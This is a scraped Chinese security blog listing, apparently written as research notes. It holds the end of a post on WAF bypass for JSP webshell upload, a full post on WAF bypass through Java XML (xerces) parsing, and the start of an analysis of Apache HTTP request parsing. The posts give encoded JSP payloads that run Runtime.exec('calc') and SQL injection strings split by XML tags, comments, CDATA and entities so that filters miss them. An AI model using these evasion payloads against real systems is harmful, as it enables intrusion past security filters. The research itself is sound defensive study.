-<p>HTML实体编码，包括16进制、10进制、字符实体：</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span><br><span class="line">&lt;jsp:root xmlns:jsp=<span class="string">"http://java.sun.com/JSP/Page"</span></span><br><span class="line">  version=<span class="string">"1.2"</span>&gt;</span><br><span class="line">&lt;jsp:directive.page contentType=<span class="string">"text/html"</span>/&gt;</span><br><span class="line">&lt;jsp:declaration&gt;</span><br><span class="line">&lt;/jsp:declaration&gt;</span><br><span class="line">&lt;jsp:scriptlet&gt;</span><br><span class="line">&amp;#111;&amp;#117;&amp;#116;&amp;#46;&amp;#119;&amp;#114;&amp;#105;&amp;#116;&amp;#101;&amp;#40;&amp;#34;&amp;#73;&amp;#39;&amp;#109;&amp;#32;&amp;#116;&amp;#117;&amp;#114;&amp;#110;&amp;#49;&amp;#116;&amp;#117;&amp;#112;&amp;#33;&amp;#34;&amp;#41;&amp;#59;</span><br><span class="line">&lt;/jsp:scriptlet&gt;</span><br><span class="line">&lt;jsp:text&gt;</span><br><span class="line">&lt;/jsp:text&gt;</span><br><span class="line">&lt;/jsp:root&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-3-PageEncoding"><a href="#2-3-PageEncoding" class="headerlink" title="2.3 PageEncoding"></a>2.3 PageEncoding</h2><p>指令标签&lt;%@方式：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType&#x3D;&quot;charset&#x3D;utf-16be&quot; %&gt;%00%3C%00%25%00%20%00o%00u%00t%00.%00w%00r%00i%00t%00e%00%28%00%22%00I%00%27%00m%00%20%00t%00u%00r%00n%001%00t%00u%00p%00%21%00%22%00%29%00%3B%00%20%00o%00u%00t%00.%00p%00r%00i%00n%00t%00%28%00R%00u%00n%00t%00i%00m%00e%00.%00g%00e%00t%00R%00u%00n%00t%00i%00m%00e%00%28%00%29%00.%00e%00x%00e%00c%00%28%00%22%00c%00a%00l%00c%00%22%00%29%00%29%00%3B%00%20%00%25%00%3E</span><br></pre></td></tr></table></figure>
-
-<p>指令标签&lt;jsp:directive.page  /&gt; 方式</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:directive.page contentType&#x3D;&quot;charset&#x3D;utf-16be&quot;&#x2F;&gt;%00%3C%00%25%00%20%00o%00u%00t%00.%00w%00r%00i%00t%00e%00%28%00%22%00I%00%27%00m%00%20%00t%00u%00r%00n%001%00t%00u%00p%00%21%00%22%00%29%00%3B%00%20%00o%00u%00t%00.%00p%00r%00i%00n%00t%00%28%00R%00u%00n%00t%00i%00m%00e%00.%00g%00e%00t%00R%00u%00n%00t%00i%00m%00e%00%28%00%29%00.%00e%00x%00e%00c%00%28%00%22%00c%00a%00l%00c%00%22%00%29%00%29%00%3B%00%20%00%25%00%3E</span><br></pre></td></tr></table></figure>
-
-<p>PageEncoding声明方式</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:directive.page pageEncoding&#x3D;&quot;utf-16be&quot;&#x2F;&gt;%00%3C%00%25%00%20%00o%00u%00t%00.%00w%00r%00i%00t%00e%00%28%00%22%00I%00%27%00m%00%20%00t%00u%00r%00n%001%00t%00u%00p%00%21%00%22%00%29%00%3B%00%20%00o%00u%00t%00.%00p%00r%00i%00n%00t%00%28%00R%00u%00n%00t%00i%00m%00e%00.%00g%00e%00t%00R%00u%00n%00t%00i%00m%00e%00%28%00%29%00.%00e%00x%00e%00c%00%28%00%22%00c%00a%00l%00c%00%22%00%29%00%29%00%3B%00%20%00%25%00%3E</span><br></pre></td></tr></table></figure>
-
-
-<p>标签的位置也可以变化：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%00%3C%00%25%00%20%00o%00u%00t%00.%00w%00r%00i%00t%00e%00%28%00%22%00I%00%27%00m%00%20%00t%00u%00r%00n%001%00t%00u%00p%00%21%00%22%00%29%00%3B%00%20%00o%00u%00t%00.%00p%00r%00i%00n%00t%00%28%00R%00u%00n%00t%00i%00m%00e%00.%00g%00e%00t%00R%00u%00n%00t%00i%00m%00e%00%28%00%29%00.%00e%00x%00e%00c%00%28%00%22%00c%00a%00l%00c%00%22%00%29%00%29%00%3B%00%20%00%25%00%3E&lt;%@ page contentType&#x3D;&quot;charset&#x3D;utf-16be&quot;</span><br></pre></td></tr></table></figure>
-
-<h1 id="3-结语"><a href="#3-结语" class="headerlink" title="3 结语"></a>3 结语</h1><p>好吧，还是有点意思。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/07/09/WAF_Bypass%E4%B9%8Bwesbhell%E4%B8%8A%E4%BC%A0-jsp%E4%B8%8Etomcat/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-WAF_Bypass之XML解析-上" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/">WAF_Bypass之XML解析-上</a>
-    </h1>
-  
-
-        
-        <a href="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/" class="archive-article-date">
-  	<time datetime="2020-06-28T12:28:55.016Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-06-28</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>XML系列将分为上下篇，本篇为上篇，主要讲述目前的原理及手法，下篇将会给出实战的应用。</p>
-<p>前段时间，笔者大致阅读了JAVA的XML解析库的底层解析代码<em>xerces</em>，实际上对于JAVA来说，所有XML解析框架、解析器，最底层用的都是它，所以绕过手法比较通用。</p>
-<p>关于XML解析的研究也算是告一段落，本文也算是笔者的一篇笔记。</p>
-<h1 id="1-Charset"><a href="#1-Charset" class="headerlink" title="1. Charset"></a>1. Charset</h1><h2 id="1-1-Magic-Charset"><a href="#1-1-Magic-Charset" class="headerlink" title="1.1 Magic Charset"></a>1.1 Magic Charset</h2><p>XML文档可以通过头部标签声明版本与字符集，常见的有UTF-8、GBK、ISO-8859-1。</p>
-<p>JAVA的底层XML解析库xerces在在读取XML文档时，首先会根据XML文档的头4个字节选择对应的字符流Reader来读取XML文档，如果XML文档有XML标签头，该Reader只是用于读取XML标签头，后续的XML内容选用什么字符流Reader则会另外根据XML标签头来决定；如果XML文档没有标签头，则该Reader将会用于读取整个XML文档。</p>
-<p>根据XML文档头4个字节选择字符流读取器的关键代码位于 jdk1.8.0_191\src.zip!\com\sun\org\apache\xerces\internal\impl\XMLEntityManager.java：</p>
-<p><img src="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/magic_charset.png" alt></p>
-<p>判断字符集的getEncodingName方法代码如下，其中UCS-4 2143、UCS-4 3412字最后是会抛异常提示不支持的字符编码。</p>
-<p><img src="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/flow_to_getEncodingName.png" alt></p>
-<p><img src="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/getEncodingName.png" alt></p>
-<p>所以最后看来，我们可以得到下面这个表，而为了方面区分，笔者将该手法称为<strong>Magic Charset</strong>。</p>
-<p><img src="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/magic_bytes.png" alt></p>
-<h2 id="1-2-Declare-Charset"><a href="#1-2-Declare-Charset" class="headerlink" title="1.2 Declare Charset"></a>1.2 Declare Charset</h2><p>如果用户在XML文档的XML头标签中中通过encoding指定了字符集，后续的XML文档读取将会根据该属性值选择一个字符流读取器。</p>
-<p>最后设置Reader的关键代码位于</p>
-<p>jdk1.8.0_191\src.zip!\com\sun\org\apache\xerces\internal\impl\XMLDocumentFragmentScannerImpl.java</p>
-<p><img src="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/scanXMLDecl.png" alt></p>
-<p>jdk1.8.0_191\src.zip!\com\sun\org\apache\xerces\internal\impl\XMLEntityScanner.java</p>
-<p><img src="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/declare_charset3.png" alt></p>
-<p><img src="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/declare_charset2.png" alt></p>
-<p>在这里，我们还另外需要关注一下createReader中的EncodingMap，这里对字符集名称做了别名的映射，如IBM037与CP037实际上是同一个字符集。</p>
-<p>jdk1.8.0_191\src.zip!\com\sun\org\apache\xerces\internal\util\EncodingMap.java：</p>
-<p><img src="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/EncodingMap.png" alt></p>
-<h2 id="1-3-Double-Charset"><a href="#1-3-Double-Charset" class="headerlink" title="1.3 Double Charset"></a>1.3 Double Charset</h2><p>由于magic charset与declare charset的逻辑是独立的，我们可以分别对XML头标签与XML内容使用不同的编码。</p>
-<h1 id="2-String-Split"><a href="#2-String-Split" class="headerlink" title="2. String Split"></a>2. String Split</h1><h2 id="2-1-LABEL-INSERT"><a href="#2-1-LABEL-INSERT" class="headerlink" title="2.1 LABEL INSERT"></a>2.1 LABEL INSERT</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span> <span class="attr">att</span>=<span class="string">"foo"</span>&gt;</span>" union select 1 -- -<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>添加额外标签进行字符串分割：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span> <span class="attr">att</span>=<span class="string">"foo"</span>&gt;</span>" uni<span class="tag">&lt;<span class="name">foo</span>&gt;</span>foo1 foo2<span class="tag">&lt;/<span class="name">foo</span>&gt;</span><span class="tag">&lt;<span class="name">foofoo</span>/&gt;</span>on select 1 -- -<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>使用注释进行字符串分割：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span> <span class="attr">att</span>=<span class="string">"foo"</span>&gt;</span>" uni<span class="comment">&lt;!--foo--&gt;</span>on select 1 -- -<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>使用PI标签进行字符串分割：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span> <span class="attr">att</span>=<span class="string">"foo"</span>&gt;</span>" uni<span class="php"><span class="meta">&lt;?</span>foo1 foo2 <span class="meta">?&gt;</span></span>on select 1 -- -<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>jdk1.8.0_191\src.zip!\com\sun\org\apache\xerces\internal\impl\XMLDocumentScannerImpl.java：</p>
-<p><img src="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/SCANNER_STATE_START_OF_MARKUP.png" alt></p>
-<h2 id="2-2-CDATA"><a href="#2-2-CDATA" class="headerlink" title="2.2 CDATA"></a>2.2 CDATA</h2><p>使用CDATA标签进行字符串分割：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span> <span class="attr">att</span>=<span class="string">"foo"</span>&gt;</span>" uni&lt;![CDATA[o]]&gt;n select 1 -- -<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="3-DTD"><a href="#3-DTD" class="headerlink" title="3. DTD"></a>3. DTD</h1><p>值得注意的是，xstream默认关闭DTD；XMLDecoder虽然没有关闭，但是对于Weblogic XMLDecoder，由于其特色的解析流程，对于Weblogic XMLDecoder是无法利用的。</p>
-<p>这里不贴代码了，有的是来源RFC，而且代码是三个月前看的，不想找啊。</p>
-<h2 id="3-1-ATTLIST"><a href="#3-1-ATTLIST" class="headerlink" title="3.1 ATTLIST"></a>3.1 ATTLIST</h2><p>标签的属性与值，可以通过DTD进行定义，原始XML文档：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.1" encoding="ISO-8859-1" ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span> <span class="attr">att</span>=<span class="string">"foo"</span>&gt;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>使用DTD ATTLIST，写作：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.1" encoding="ISO-8859-1" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ATTLIST <span class="meta-keyword">test</span> <span class="meta-keyword">att</span> <span class="meta-keyword">CDATA</span> <span class="meta-keyword">#FIXED</span> <span class="meta-string">"foo"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>使用HTML编码、CDATA也可以：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.1" encoding="ISO-8859-1" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ATTLIST <span class="meta-keyword">test</span> <span class="meta-keyword">att</span> <span class="meta-keyword">CDATA</span> <span class="meta-keyword">#FIXED</span> <span class="meta-string">"&lt;![CDATA[f]]&gt;&amp;#x6f;o"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="3-2-local-entity"><a href="#3-2-local-entity" class="headerlink" title="3.2 local entity"></a>3.2 local entity</h2><p>通过在DTD中定义本地实体，可在标签属性值、标签内容、DTD字符串值，这些字符串区域引用。</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>" union select 1 -- -<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>使用本地实体：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">test1</span> <span class="meta-string">"select"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">test2</span> <span class="meta-string">"union"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>" &amp;test2; &amp;test1; 1 -- -<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<p>使用HTML编码、CDATA也可以：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">test1</span> <span class="meta-string">"&lt;![CDATA[el]]&gt;ect"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">test2</span> <span class="meta-string">"&amp;#x75;&amp;#x6e;&amp;#x69;&amp;#x6f;&amp;#x6e;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>" &amp;test2; &amp;test1; 1 -- -<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="4-XML1-1"><a href="#4-XML1-1" class="headerlink" title="4. XML1.1"></a>4. XML1.1</h1><h2 id="4-1-space-char"><a href="#4-1-space-char" class="headerlink" title="4.1 space char"></a>4.1 space char</h2><p>当XML版本被声明为1.1时，XML的解析将支持一些额外的空白字符、控制字符。</p>
-<p>jdk1.8.0_191\src.zip!\com\sun\org\apache\xerces\internal\impl\XML11EntityScanner.java：</p>
-<p><img src="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/xml11_space_char.png" alt></p>
-<p>jdk1.8.0_191\src.zip!\com\sun\org\apache\xerces\internal\parsers\XML11Configuration.java：</p>
-<p><img src="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/xml11Configuration.png" alt></p>
-<p>代码中的\x85是指码点，而非我们平时所见的unicdoe字符。而\x85二进制为‭10000101‬，高位为1，根据笔者认知，UTF-8无法使得8比特码点成为UTF-8字符，因此我们无法在UTF-8中使用它，但在ISO-8859-1、UTF-16等字符集中我们可以使用它：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.1" encoding="iso-8859-1"?&gt;</span>%85<span class="tag">&lt;<span class="name">root%85</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">root%85</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>在UTF-16BE中对应的unicode字符为\x00\x85：</p>
-<p>同样的，\x28\x20是指码点，其UTF-8编码字符为%E2%80%A8，推导过程如下：</p>
-<p>\x20 \x28转2进制比特：<br>00100000 00101000<br>UTF-8中三个字节的编码规范：<br>1110XXXX 10XXXXXX 10XXXXXX<br>\x20\x28转UTF-8的2进制比特：<br>11100010 10000000 10101000<br>\x20\x28的UTF-8编码为:<br>%E2%80%A8</p>
-<p>于是我们可以对XML文档进行如下修改：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.1" encoding="utf-8"?&gt;</span>%E2%80%A8<span class="tag">&lt;<span class="name">root%E2%80%A8</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">root%E2%80%A8</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>由于底层代码逻辑多，起初还想边看边画一些要点的逻辑流程，但是这样太慢了，前期收益太低。现在看来，这样会导致无法详尽逻辑点，也让后期的再次整理与回顾变得艰难，另外笔者看代码时也遗漏了一些绕过方式，如PI分割字符串。常见的XML服务器，除开JAVA外，还有.NET、PHP，而作为XML的子集SOAP，不知SOAP自身是否还有其他骚操作，这样想来，本文总结的绕过手法也未必详尽。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/06/28/WAF_Bypass%E4%B9%8BXML%E8%A7%A3%E6%9E%90-%E4%B8%8A/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-简析Apache如何解析HTTP请求" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/06/16/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/">简析Apache如何解析HTTP请求</a>
-    </h1>
-  
-
-        
-        <a href="/2020/06/16/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/" class="archive-article-date">
-  	<time datetime="2020-06-16T16:05:35.829Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-06-16</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>该文章写于 2019-10</p>
-<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>之前看了看Apache是如何解析HTTP请求的，整理了一下笔记，说说其中的一些要点。</p>
-<p>首先，在最新版本的Apache服务器http2.4.41中，似乎移除了对HTTP的许多“兼容特性”，这些特性是不符合RFC标准的，而笔者当时阅读的代码为2.4.3，本文记录了笔者在阅读代码时认为十分重要的一些解析细节。</p>
-<h2 id="read-a-line"><a href="#read-a-line" class="headerlink" title="read a line"></a>read a line</h2><p>Apache读到LF字符时，就判断一行已经读完了。</p>
-<p><img src="/2020/06/16/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575636988533.png" alt="1575636988533"></p>
-<p><img src="/2020/06/16/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575637029446.png" alt="1575637029446"></p>
-<h2 id="before-request-line"><a href="#before-request-line" class="headerlink" title="before request line"></a>before request line</h2><p>读取请求行时，会跳过blank line，默认为DEFAULT_LIMIT_BLANK_LINES 次 （limit_req_fields没有被初始化），奇怪的是在2.4.3源码中没有搜索到定义值，在2.4.41中倒是搜索到了。</p>
-<p>Apache之所以会这样做，代码中解释说，浏览器在发POST请求时，会在末尾添加CRLF，如果形成一个pileline请求，request line前面就会有空行。</p>
-<p><img src="/2020/06/16/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575637431252.png" alt="1575637431252"></p>
-<p><img src="/2020/06/16/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575637515203.png" alt="1575637515203"></p>
-<p><img src="/2020/06/16/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575637273820.png" alt="1575637273820"></p>
-<h2 id="request-line"><a href="#request-line" class="headerlink" title="request line"></a>request line</h2><p>请求行默认长度最大为8190字节，请求行由三部分组成 method、uri、version</p>
-<p><img src="/2020/06/16/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575636873879.png" alt="1575636873879"></p>
-<p><img src="/2020/06/16/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575637842396.png" alt="1575637842396"></p>
-<p>在获取method 、uri的时候，需要判断是否空白字符，2.4.3使用isspace来判断是否空白字符。</p>
-<p><img src="/2020/06/16/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575638543636.png" alt="1575638543636"></p>
-<p><img src="/2020/06/16/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575638436652.png" alt="1575638436652"></p>
-<p>内置method有26个，未被识别时返回UNKNOWN_METHOD（为啥phpstudy搭建的2.4.23 瞎写method都可以…）</p>
-<p><img src="/2020/06/16/%E7%AE%80%E6%9E%90Apache%E5%A6%82%E4%BD%95%E8%A7%A3%E6%9E%90HTTP%E8%AF%B7%E6%B1%82/1575639434615.png" alt="1575639434615"></p>
